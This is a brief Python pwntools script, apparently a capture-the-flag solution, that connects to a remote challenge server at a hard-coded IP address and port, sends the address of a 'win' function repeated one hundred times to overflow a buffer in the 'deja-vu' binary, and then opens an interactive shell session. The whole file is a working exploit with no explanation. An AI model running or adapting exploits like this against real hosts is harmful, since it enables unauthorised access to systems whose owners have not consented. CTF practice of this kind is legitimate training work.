from pwn import *
from ctftools.pwn.common import connect

exe = ELF("deja-vu")
# io = connect(exe, "host", 1337)
io = connect(exe, "20.84.72.194", 5000)

print(exe.symbols.win)

io.sendline(pack(exe.symbols.win) * 100)

io.interactive()
